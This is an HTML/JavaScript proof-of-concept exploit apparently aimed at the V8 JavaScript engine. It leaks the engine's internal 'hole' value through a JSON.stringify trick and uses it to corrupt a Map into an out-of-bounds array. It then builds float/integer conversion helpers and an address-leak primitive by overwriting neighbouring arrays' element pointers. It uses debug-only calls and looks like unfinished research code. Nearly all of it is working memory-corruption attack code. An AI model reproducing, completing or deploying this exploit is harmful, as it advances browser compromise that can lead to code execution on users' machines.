<html>
    <pre id='log'></pre>
    <script>
        function log(str) {
            var _log = document.getElementById('log');
            if (_log) {
                _log.innerText += str + '\n';
            }
        }
        function trigger_starlabs() {
            let a = [], b = [];
            let s = '"'.repeat(0x800000);
            a[20000] = s;
            for (let i = 0; i < 10; i++) a[i] = s;
            for (let i = 0; i < 10; i++) b[i] = a;

            try {
                JSON.stringify(b);
            } catch (hole) {
                return hole;
            }
            throw new Error('could not trigger');
        }

        let hole = trigger_starlabs();
        log("[+] Accessing the hole like so seems to stablize the oob? " + hole);

        var map = new Map();
        map.set(1, 1);
        map.set(hole, 1);
        map.delete(hole);
        map.delete(hole);
        map.delete(1);

        oob_arr = [1.1, 1.1, 1.1, 1.1];
        victim_arr = [2.2, 2.2, 2.2, 2.2];
        obj_arr = [{}, {}, {}, {}];

        map.set(0x1c, -1);
        map.set(0x111, 0);

        log("[+] Sanity check (should not be 4): " + oob_arr.length);

	let ab = new ArrayBuffer(0x8);
        let fb = new Float64Array(ab);
        let bb = new BigUint64Array(ab);

	function itof(_integer) {
		bb[0] = _integer
		return fb[0]; 
	}

	function ftoi(_float) {
		fb[0] = _float
		return bb[0];	
	};
	
	%DebugPrint(victim_arr);
	%DebugPrint(obj_arr);

    for (let i = 0; i < 100 ; i+=1) {
		if (1===2) log("[?] " + i + ": " + ftoi(oob_arr[i]).toString(16).toString(16))
	}

	if (oob_arr.length !== 4) {
        alert("hook on to me!");
	} else {
		window.location.reload() // will crash, most probably due to garbage collection/some object validation
	}

	let ELEMENT_LENGTH_INDEX_FLOAT = 12
	let ELEMENT_LENGTH_INDEX_OBJEC = 31
    let ELEMENT_FLOAT = ftoi(oob_arr[12]) & 0xffffffffn;

    function addrof(o) {
        oob_arr[12] = itof((0x8n << 32n) | ELEMENT_FLOAT); // set victim_arr's element pointer & size
        oob_arr[31] = itof((0x8n << 32n) | ELEMENT_FLOAT); // set obj_arr's element pointer & size
        obj_arr[0] = o;
        return ftoi(victim_arr[0]) & 0xffffffffn;
    }

    let test = {};
    %DebugPrint(test);
    print(addrof(test));

    </script>
</html>